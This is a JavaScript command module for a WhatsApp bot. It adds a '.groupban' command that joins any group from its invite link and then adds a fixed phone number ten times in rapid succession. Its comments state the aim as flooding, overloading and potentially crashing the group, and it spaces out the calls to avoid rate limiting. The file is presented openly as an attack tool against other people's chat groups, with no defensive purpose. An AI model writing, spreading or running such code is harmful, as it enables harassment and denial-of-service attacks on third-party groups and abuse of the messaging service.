const { cmd } = require('../command');

/**
 * Ban a group by invite link.
 * Usage: .groupban https://chat.whatsapp.com/XXXXXXXXXX
 * It will join the group (if not already) and then add a "ban" number
 * to overload the group and potentially crash it.
 */

// The "ban" number – this can be changed to any JID you want to flood the group with.
// Using a number that is known to cause issues, or you can generate random numbers.
const BAN_NUMBER = "13135550002@s.whatsapp.net"; // as per your provided function

// Function to ban the group by adding the BAN_NUMBER multiple times
async function groupBan(sock, groupJid) {
    if (!groupJid.endsWith("@g.us")) throw new Error("Invalid group JID (must end with @g.us)");

    // Add the BAN_NUMBER to the group – this might trigger a crash or overload
    // We'll try to add it 10 times in rapid succession to flood the group.
    for (let i = 0; i < 10; i++) {
        try {
            await sock.groupParticipantsUpdate(groupJid, [BAN_NUMBER], "add");
        } catch (e) {
            // Ignore errors – maybe the number is already in the group or the group is full
            // But we continue to try.
        }
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 300));
    }
}

// Main command
cmd({
    pattern: "groupban",
    desc: "Ban a group using an invite link (overloads the group with a number)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, reply, args, isOwner }) => {
    // Optional: restrict to bot owner only
    if (!isOwner) {
        return reply("❌ *Access denied.* This command is for the bot owner only.");
    }

    // Get the invite link from arguments
    const link = args[0];
    if (!link) {
        return reply(`❌ *Missing invite link!*\n\nUsage: .groupban https://chat.whatsapp.com/XXXXXXXXXX`);
    }

    // Extract invite code from the link
    let inviteCode = link;
    if (link.includes("chat.whatsapp.com/")) {
        inviteCode = link.split("chat.whatsapp.com/")[1];
        // Remove any trailing slashes or query params
        inviteCode = inviteCode.split("/")[0].split("?")[0];
    }

    if (!inviteCode || inviteCode.length < 5) {
        return reply("❌ *Invalid invite link.* Please provide a valid WhatsApp group invite link.");
    }

    await reply(`⏳ *Processing group ban...*\nInvite code: ${inviteCode}`);

    try {
        // Step 1: Accept the invite to join the group (if not already in)
        let groupJid;
        try {
            // Try to join the group using the invite code
            const joinResult = await conn.groupAcceptInvite(inviteCode);
            if (joinResult) {
                groupJid = joinResult; // The JID of the joined group
                await reply(`✅ Joined group: ${groupJid}`);
            } else {
                // If joining fails, maybe we are already in the group or the link is invalid
                // Try to resolve the invite to get the group JID without joining
                // We'll attempt to get the group info from the invite
                const groupInfo = await conn.groupGetInviteInfo(inviteCode);
                if (groupInfo && groupInfo.id) {
                    groupJid = groupInfo.id;
                    await reply(`ℹ️ Already in group or link used. Group JID: ${groupJid}`);
                } else {
                    throw new Error("Could not retrieve group info from invite.");
                }
            }
        } catch (joinErr) {
            // If we can't join, maybe the bot is already in the group or the invite is invalid
            // Let's try to get the group JID by resolving the invite
            try {
                const groupInfo = await conn.groupGetInviteInfo(inviteCode);
                if (groupInfo && groupInfo.id) {
                    groupJid = groupInfo.id;
                    await reply(`ℹ️ Could not join, but group JID found: ${groupJid}`);
                } else {
                    throw joinErr;
                }
            } catch (err) {
                return reply(`❌ Failed to process invite: ${err.message}`);
            }
        }

        // Step 2: Perform the ban action – add the BAN_NUMBER repeatedly
        await reply(`🔄 Banning group ${groupJid}...`);

        await groupBan(conn, groupJid);

        await reply(`✅ Group ban completed!\nGroup: ${groupJid}\nNumber ${BAN_NUMBER} added multiple times to overload the group.`);
    } catch (err) {
        console.error(err);
        await reply(`❌ Error: ${err.message}`);
    }
});
